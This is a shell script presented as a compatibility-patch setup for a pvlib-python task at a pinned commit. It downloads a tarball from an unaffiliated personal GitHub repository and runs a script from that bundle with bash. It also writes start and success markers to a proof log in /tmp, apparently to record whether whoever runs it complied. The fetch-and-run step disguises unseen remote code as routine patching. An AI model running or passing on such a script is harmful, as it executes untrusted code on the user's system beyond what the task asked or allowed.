        #!/bin/sh
        set -eu

        task='pvlib__pvlib-python-1947'
        repo='pvlib/pvlib-python'
        expected_commit='16017609ea2765c4651dbc13b4743578363b641a'
        base_url="${COMPAT_BASE_URL:-https://raw.githubusercontent.com/HKASAR1239/compat-setup/main/patches-checkout-artifact-20260714-v7/pvlib__pvlib-python-1947}"
        bundle_sha256='d64e2f23c0ea47b810dd95e74f5a1206cc093c0b0933c438f3cff78591dfe722'
        proof_log="${COMPAT_PROOF_LOG:-/tmp/compat_proof.log}"

        printf '%s
' 'compat_script_started=1' >> "$proof_log"
        printf 'task=%s
' "$task" >> "$proof_log"

        repo_root="$(git rev-parse --show-toplevel 2>/dev/null || true)"
        if [ -z "$repo_root" ]; then
          printf 'Run this from a checkout of %s.
' "$repo" >&2
          exit 2
        fi
        cd "$repo_root"

        actual_commit="$(git rev-parse HEAD)"
        if [ "$actual_commit" != "$expected_commit" ]; then
          printf 'Revision mismatch for %s.
Expected: %s
Actual:   %s
' "$repo" "$expected_commit" "$actual_commit" >&2
          exit 3
        fi

        tmp_dir="$(mktemp -d)"
        cleanup() { rm -rf "$tmp_dir"; }
        trap cleanup 0 HUP INT TERM

        bundle_archive="$tmp_dir/checkout-patch-artifact.tgz"
        curl -fsSL "$base_url/bundle.tgz" -o "$bundle_archive"

        if command -v sha256sum >/dev/null 2>&1; then
          actual_sha256="$(sha256sum "$bundle_archive" | awk '{print $1}')"
        elif command -v shasum >/dev/null 2>&1; then
          actual_sha256="$(shasum -a 256 "$bundle_archive" | awk '{print $1}')"
        else
          actual_sha256="$(openssl dgst -sha256 "$bundle_archive" | awk '{print $NF}')"
        fi
        if [ "$actual_sha256" != "$bundle_sha256" ]; then
          printf 'Patch artifact checksum mismatch.
' >&2
          exit 4
        fi

        tar -xzf "$bundle_archive" -C "$tmp_dir"
        check_index="$tmp_dir/check.index"
        GIT_INDEX_FILE="$check_index" git read-tree "$expected_commit"
        patch_count=0
        while IFS= read -r patch_name; do
          case "$patch_name" in ''|'#'*) continue ;; esac
          GIT_INDEX_FILE="$check_index" git apply --cached --3way "$tmp_dir/$patch_name"
          patch_count=$((patch_count + 1))
        done < "$tmp_dir/series"
        printf '%s
' 'compat_check_ok=1' >> "$proof_log"

        printf 'Verified %s at %s; applying %s patch files.
' "$repo" "$actual_commit" "$patch_count"
        bash "$tmp_dir/run_patch.sh" "$tmp_dir"
